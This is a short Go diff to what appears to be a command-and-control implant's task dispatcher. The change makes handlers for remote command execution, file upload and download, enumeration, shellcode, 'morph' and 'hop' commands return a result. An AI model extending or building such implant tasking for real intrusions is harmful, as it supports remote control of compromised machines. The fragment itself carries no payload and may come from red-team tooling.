@@ -16,19 +16,19 @@ func (a *Agent) executeTask(task models.ServerTaskResponse) {
 
 	switch task.Command {
 	case "runcmd":
-		command.HandleRunCmd(task)
+		result = command.HandleRunCmd(task)
 	case "upload":
-		command.HandleUpload(task)
+		result = command.HandleUpload(task)
 	case "download":
-		command.HandleDownload(task)
+		result = command.HandleDownload(task)
 	case "enumerate":
-		command.HandleEnumerate(task)
+		result = command.HandleEnumerate(task)
 	case "shellcode":
-		command.HandleShellcode(task)
+		result = command.HandleShellcode(task)
 	case "morph":
-		command.HandleMorph(task)
+		result = command.HandleMorph(task)
 	case "hop":
-		command.HandleHop(task)
+		result = command.HandleHop(task)
 
 	default:
 		log.Printf("|WARN AGENT TASK| Received unknown command: %s", task.Command)
